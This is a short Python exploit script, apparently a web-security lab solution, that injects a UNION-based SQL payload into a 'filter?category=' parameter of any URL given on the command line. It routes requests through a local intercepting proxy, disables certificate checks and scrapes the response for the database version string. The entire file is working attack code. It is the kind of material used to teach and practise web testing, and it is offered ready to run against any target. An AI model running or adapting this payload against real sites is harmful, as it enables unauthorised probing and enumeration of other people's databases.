import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit(url):
    uri = "filter?category="
    payload = "' union select @@version, null%23"
    request = requests.get(url + uri + payload, verify=False, proxies=proxies)
    response = request.text
    if request.status_code == 200:
        soup = BeautifulSoup(response, 'html.parser')
        ver = soup.find(text=re.compile(f'.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
        if ver is None:
            return False
        else:
            print(f"[+] version: {ver}")
            return True

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[!] error: {sys.argv[0]} <url>")
        sys.exit(1)

    print("[?] finding version...")
    if not exploit(url):
        print("[-] status: failure")
